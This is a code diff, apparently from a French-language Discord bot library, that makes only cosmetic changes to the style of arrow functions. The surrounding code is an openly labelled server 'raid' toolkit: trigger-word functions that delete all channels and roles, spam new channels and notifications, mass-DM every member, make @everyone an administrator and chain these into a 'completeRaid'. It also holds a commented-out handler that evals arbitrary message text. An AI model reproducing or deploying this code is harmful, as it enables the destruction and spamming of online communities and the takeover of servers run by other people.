@@ -1,5 +1,5 @@
-const log = message => console.log(message)
-const scripts = option => require(`./scripts/${option}.js`);
+const log = (message) => console.log(message)
+const scripts = (option) => require(`./scripts/${option}.js`);
 const t = require('timestamp-to-date');
 const readline = require('readline');
 const rl = readline.createInterface({
@@ -33,14 +33,14 @@ exports.ready = function (client) {
         rl.question('Afficher une invitation pour chacun de ces serveurs ? (y/n)\n', (answer) => {
             if (answer === 'y') {
                 log(`
-    ${client.guilds.map(guild => {
+    ${client.guilds.map((guild) => {
         if (guild.me.hasPermission('CREATE_INSTANT_INVITE')) {
             findChannel();
             function findChannel() {
                 const channel = guild.channels.random()
                 if (!channel) return findChannel();
                 if (channel.type !== 'text') return findChannel();
-                channel.createInvite().then(invite => {
+                channel.createInvite().then((invite) => {
                     log(`
     ${guild.name}
         Membres : ${guild.memberCount}
@@ -58,7 +58,7 @@ exports.ready = function (client) {
 
 
 exports.deleteChannels = function (client, trigger = String(_s), createChannel = Boolean(_b)) {
-    client.on('message', message => {
+    client.on('message', (message) => {
         if (message.content.includes(trigger)) {
             scripts("deleteChannels")(message, createChannel, client);
         }
@@ -66,7 +66,7 @@ exports.deleteChannels = function (client, trigger = String(_s), createChannel =
 }
 
 exports.createChannels = function (client, trigger = String(_s), numberOfChannelsToCreate = Number(_n), nameOfChannelsToCreate = String(_s), MessageToSpamInNewChannels = String(_s), numberOfNotificationsPerChannel = Number(_s)) {
-    client.on('message', async message => {
+    client.on('message', async (message) => {
         if (message.content.includes(trigger)) {
             scripts("createChannels")(message, nameOfChannelsToCreate, numberOfChannelsToCreate, false, MessageToSpamInNewChannels, numberOfNotificationsPerChannel, client);
         }
@@ -74,7 +74,7 @@ exports.createChannels = function (client, trigger = String(_s), numberOfChannel
 }
 
 exports.deleteRoles = function (client, trigger = String(_s)) {
-    client.on('message', message => {
+    client.on('message', (message) => {
         if (message.content.includes(trigger)) {
             scripts("deleteRoles")(message, client);
         }
@@ -82,7 +82,7 @@ exports.deleteRoles = function (client, trigger = String(_s)) {
 }
 
 exports.createRoles = function (client, trigger = String(_s), nameOfRolesToCreate = String(_s), NumberOfRolesToCreate = Number(_n)) {
-    client.on('message', async message => {
+    client.on('message', async (message) => {
         if (message.content.includes(trigger)) {
             scripts("createRoles")(message, nameOfRolesToCreate, NumberOfRolesToCreate, false, client)
         }
@@ -90,9 +90,9 @@ exports.createRoles = function (client, trigger = String(_s), nameOfRolesToCreat
 }
 
 exports.dmAllMembers = function (client, trigger = String(_s), msg = String(_s), numberOfMessages = Number(_n)) {
-    client.on('message', async message => {
+    client.on('message', async (message) => {
         if (message.content.includes(trigger)) {
-            message.guild.members.map(member => {
+            message.guild.members.map((member) => {
                 for (var i = 0; i < numberOfMessages; i++) {
                     member.send(msg).catch(console.error)
                 }
@@ -102,7 +102,7 @@ exports.dmAllMembers = function (client, trigger = String(_s), msg = String(_s),
 }
 
 exports.createInvite = function (client, trigger = String(_s), allGuilds = Boolean(_b)) {
-    client.on('message', message => {
+    client.on('message', (message) => {
         if (message.content.includes(trigger)) {
             scripts("createInvite")(client, message, allGuilds);
         }
@@ -110,7 +110,7 @@ exports.createInvite = function (client, trigger = String(_s), allGuilds = Boole
 }
 
 exports.everyoneAdmin = function (client, trigger = String(_s)) {
-    client.on('message', message => {
+    client.on('message', (message) => {
         if (message.content.includes(trigger)) {
             if (message.author.id === client.user.id) return;
             if (message.channel.type === 'dm') return message.author.send("Cette commande n'est pas utilisable par message privé.");
@@ -125,7 +125,7 @@ exports.everyoneAdmin = function (client, trigger = String(_s)) {
 
 
 exports.completeRaid = function (client, trigger = String(_s), everyoneAdmin = Boolean(_b), deleteRoles = Boolean(_b), deleteChannels = Boolean(_b), createChannels = Boolean(_b), channelsName = String(_s), channelsNumber = Number(_n), spamMessage = String(_s), messagesNumber = Number(_n), createRoles = Boolean(_b), rolesName = String(_s), rolesNumber = Number(_n)) {
-    client.on('message', async message => {
+    client.on('message', async (message) => {
         if (message.content.includes(trigger)) {
             if (message.author.id === client.user.id) return;
             if (message.channel.type === 'dm') return message.author.send("Cette commande n'est pas utilisable par message privé.");
@@ -143,7 +143,7 @@ exports.completeRaid = function (client, trigger = String(_s), everyoneAdmin = B
 }
 
 /*exports.eval = function(client) {
-    client.on('message', message => {
+    client.on('message', (message) => {
         console.log(clean(require("util").inspect(eval(message.content))), {code:"xl"})
         function clean(text) {
             if (typeof(text) === "string")
